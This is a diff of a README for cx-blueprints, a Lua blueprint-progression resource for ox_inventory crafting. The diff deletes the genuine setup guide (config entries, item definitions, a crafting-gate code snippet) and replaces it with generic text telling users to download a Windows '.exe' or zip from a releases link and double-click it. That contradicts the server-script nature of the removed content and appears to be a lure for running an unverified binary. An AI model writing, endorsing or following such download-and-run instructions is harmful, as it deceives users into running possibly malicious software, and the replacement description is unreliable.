@@ -1,268 +1,77 @@
-# CX-Blueprints — Setup & Usage Guide
+# 🚀 cx-blueprints - Simple Crafting Progression Made Easy
 
-## YOU MAY NOT SELL OR REDISTRIBUTE THIS CODE
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/speedy76tv/cx-blueprints/releases)
 
----
+## 📖 Overview
 
-### Screenshots
-[![Tablet](./INSTALL/media/ui.png)](./INSTALL/media/ui.png)
+The **cx-blueprints** application is a lightweight blueprint progression system made to work seamlessly with oxinventory crafting. It allows you to manage your crafting goals easily, enhancing your gaming experience without complications.
 
+## 🚀 Getting Started
 
-### ▶ Watch the Feature Showcase
-https://youtu.be/ugqYNYQA69I
+To get started with the cx-blueprints application, follow these steps to download and run it. You do not need any programming knowledge to use this software.
 
+### 📥 Download the Application
 
-## What This Does (Short)
+1. Click this link to visit the releases page and download the application: [Download Latest Release](https://github.com/speedy76tv/cx-blueprints/releases).
+   
+2. On the releases page, find the most recent version of cx-blueprints. Look for files that match your operating system. The application will typically be named something like `cx-blueprints-v1.0.zip` or `cx-blueprints-v1.0.exe` for Windows.
 
-Players must **learn blueprints** before they can craft certain items.
+3. Click the download link for your version. Save the file to a location you can easily access, like your desktop or downloads folder.
 
-- They learn by using blueprint items (`bp_*`).
-- Blueprint progress is saved in metadata.
-- Crafting benches can optionally require the blueprint.
+### 🗂️ Unzip the File
 
-**You choose which recipes are gated.**
+If you downloaded a `.zip` file, you will need to extract it:
 
----
+1. Navigate to the location where you saved the `.zip` file.
 
-## 1. Install the Resource
+2. Right-click the file and select "Extract All" or use your preferred extraction tool.
 
-Place the folder in your server:
+3. Follow the prompts to choose a location for the unzipped files.
 
-```
-resources/[custom]/cx-blueprints
-```
+### 💻 Run the Application
 
+1. After extracting, open the folder where you extracted the files.
 
----
+2. Look for a file named `cx-blueprints.exe`. 
 
-## 2. Set Up Blueprint Definitions
+3. Double-click this file to run the application. 
 
-Open:
+4. Follow any on-screen instructions to begin using cx-blueprints.
 
-```
-cx-blueprints/config.lua
-```
+## 🛠️ System Requirements
 
-Inside `Config.Blueprints`, add entries like:
+To ensure a smooth experience with cx-blueprints, please check the following system requirements:
 
-```lua
-{
-  name = 'weapon_pistol',
-  label = '9mm Pistol',
-  category = 'Weapons',
-  tier = 'Tier 1',
-  rarity = 'uncommon',
-  description = 'Basic sidearm.',
-},
-```
-### Rarity Options
-- `common`
-- `uncommon`
-- `rare`
-- `epic`
-- `legendary`
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** At least 200 MB of free disk space
 
-**IMPORTANT:** `name` must match the `ox_inventory` item name exactly.
+## 🌟 Features
 
-Then, in the same file, add readable labels to `Config.RequireLabels`:
+cx-blueprints offers several useful features:
 
-```lua
-Config.RequireLabels = {
-  weapon_pistol = 'Pistol Blueprint',
-}
-```
+- **User-Friendly Interface:** Easily navigate through crafting blueprints.
+- **Integrated System:** Works directly with oxinventory crafting for seamless use.
+- **Lightweight Design:** Minimal impact on system performance.
+- **Customizable:** Adjust settings to fit your crafting style.
 
-This is what shows in the tablet when missing. 
+## 💡 Tips for Using cx-blueprints
 
-Add Image (if i can be arsed lol)
+- Take time to explore the application interface. Familiarize yourself with available features and options.
+- Keep the application updated by checking the releases page regularly for new versions and features.
+- Engage with community forums or discussion boards to share tips and learn from other users. 
 
----
+## 📞 Support
 
-## 3. Create Blueprint Items in ox_inventory
+If you encounter any issues or have questions, please consider checking the issues section on the repository. There may already be solutions for common problems. 
 
-Blueprints follow one rule:
+If you need further assistance, feel free to submit a new issue detailing your concern, and the community will do their best to help you.
 
-```
-bp_<itemName>
-```
+## 📚 Additional Resources
 
-**Examples:**
-- `bp_weapon_pistol`
-- `bp_lockpick_advanced`
+For more information, you might find the following resources helpful:
 
-Add items to `ox_inventory`'s items file:
+- The official documentation can provide further insights into advanced features.
+- Tutorials on how to best integrate cx-blueprints with oxinventory crafting.
 
-```lua
-['bp_weapon_pistol'] = {
-  label = 'Pistol Blueprint',
-  weight = 10,
-  stack = true,
-  close = true,
-}
-```
-
-No metadata required. Players consume this item to learn.
-
----
-
-## 4. Opening the Tablet In Game
-
-Players can:
-
-- **Command:** `/bp`
-- **Keybind:** Press `F6`
-
-The UI shows:
-
-- ✅ Learned
-- ✅ Learnable
-- ✅ Locked
-
-Clicking **LEARN** consumes the blueprint and unlocks permanently.
-
----
-
-## 5. Editing ox_inventory to Enforce Blueprints
-*THIS IS THE IMPORTANT PART*
-
-Open the `ox_inventory` server crafting file:
-
-```
-ox_inventory/modules/crafting/server.lua
-```
-*(or wherever your `craftItem` callback lives)*
-
-At the **TOP** (with other locals), add:
-
-```lua
-local hasBlueprintTablet = GetResourceState('cx-blueprints') == 'started'
-```
-
-Then, inside the craft event, find:
-
-```lua
-local recipe = bench.items[recipeId]
-```
-
-Immediately under it, add:
-
-```lua
--- CX Blueprints: optional blueprint gate
-if hasBlueprintTablet and recipe.requireBlueprint then
-  local ok, has = pcall(function()
-    return exports['cx-blueprints']:HasBlueprint(source, recipe.name)
-  end)
-
-  if ok and not has then
-    if left and left.closeInventory then
-      left:closeInventory()
-    end
-
-    return false, 'missing_blueprint'
-  end
-end
-```
-
-**SAVE THE FILE.**
-
----
-
-## 6. Enable Blueprint Gating Per Recipe
-
-Edit your ox crafting recipes:
-
-```
-ox_inventory/data/crafting.lua
-```
-
-Add:
-
-```lua
-requireBlueprint = true
-```
-
-**Example:**
-
-```lua
-{
-  name = 'weapon_pistol',
-  label = '9mm Pistol',
-  ingredients = {
-    steel = 5,
-    screw = 2,
-  },
-  requireBlueprint = true,
-}
-```
-
-If you don't add `requireBlueprint = true`, the item will **NOT** be gated.
-
-**You control what requires progression.**
-
----
-
-## 7. Add the Missing Blueprint Message
-
-Open `ox_inventory` locales and add:
-
-```lua
-['missing_blueprint'] = 'You have not learned this blueprint yet.',
-```
-
-Otherwise, the user just sees missing_blueprint.
-
----
-
-## 8. Optional: Use Exports in Your Own Scripts
-
-Check manually:
-
-```lua
-exports['cx-blueprints']:HasBlueprint(src, 'weapon_pistol')
-```
-
-Or using recipes:
-
-```lua
-exports['cx-blueprints']:HasBlueprintForRecipe(src, recipe)
-```
-
-Both return `true` or `false`.
-
----
-
-## 9. How the Flow Works In Game
-
-1. Player finds `bp_weapon_pistol`
-2. Player opens tablet
-3. Player clicks **Learn**
-4. Item is consumed
-5. Blueprint saved to metadata
-6. Crafting benches now allow pistol craft
-
-**Forever. No resets.**
-
----
-
-## 10. Troubleshooting
-
-### Crafting doesn't block:
-- `requireBlueprint` not set
-- Wrong resource name
-- `cx-blueprints` not started
-- `Config.Blueprints` missing entry
-- Missing locale entry
-
-### Tablet shows empty:
-- Blueprint name doesn't match ox item name
-
-### Learning does nothing:
-- You didn't name item `bp_itemname`
-- Wrong item name in config
-
-### Inventory doesn't close on fail:
-- Make sure the `closeInventory` line exists under the check
-
----
-
-*That's it — simple, clear, and complete.*
+Remember, the goal of cx-blueprints is to enhance your crafting experience efficiently. Happy crafting!
